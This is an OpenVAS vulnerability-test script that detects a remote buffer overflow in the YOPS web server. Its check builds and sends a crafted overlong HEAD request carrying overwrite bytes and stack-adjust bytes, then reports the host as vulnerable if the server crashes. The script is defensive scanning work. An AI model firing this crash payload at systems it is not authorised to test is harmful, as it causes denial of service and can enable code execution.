###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_yops_43156.nasl 5390 2017-02-21 18:39:27Z mime $
#
# YOPS (Your Own Personal [WEB] Server) Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "YOPS (Your Own Personal [WEB] Server) is prone to a remote buffer-
overflow vulnerability because it fails to perform adequate
checks on user-supplied input.

Successfully exploiting this issue may allow remote attackers to
execute arbitrary commands in the context of the application. Failed
attacks will cause denial-of-service conditions.

YOPS (Your Own Personal [WEB] Server) 2009-11-30 is vulnerable; other
versions may also be affected.";

tag_solution = "The vendor released a patch. Please see the references for more
information.";

if (description)
{
 script_id(100917);
 script_version("$Revision: 5390 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-11-26 13:31:06 +0100 (Fri, 26 Nov 2010)");
 script_bugtraq_id(43156);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("YOPS (Your Own Personal [WEB] Server) Remote Buffer Overflow Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43156");
 script_xref(name : "URL" , value : "http://zed.karelia.ru/yops/index.html");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/yops2009");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Buffer overflow");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 8888);
 script_mandatory_keys("swebs/banner");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

if(safe_checks())exit(0);

port = get_http_port(default:8888);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "Server: swebs" >!< banner)exit(0);

buffer = "HEAD ";
buffer += crap(data:"A", length:802);
buffer += crap(data:raw_string(0x47,0xce,0x04,0x08),length:4*4);
buffer += " HTTP/1.1";

stackadjust = raw_string(0xcb,0xbc,0x69,0x69,0x96,0xb0);

payload = buffer + stackadjust + string("\r\n\r\n");

soc = http_open_socket(port);
if(!soc)exit(0);

send(socket:soc, data:payload);
close(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(0);

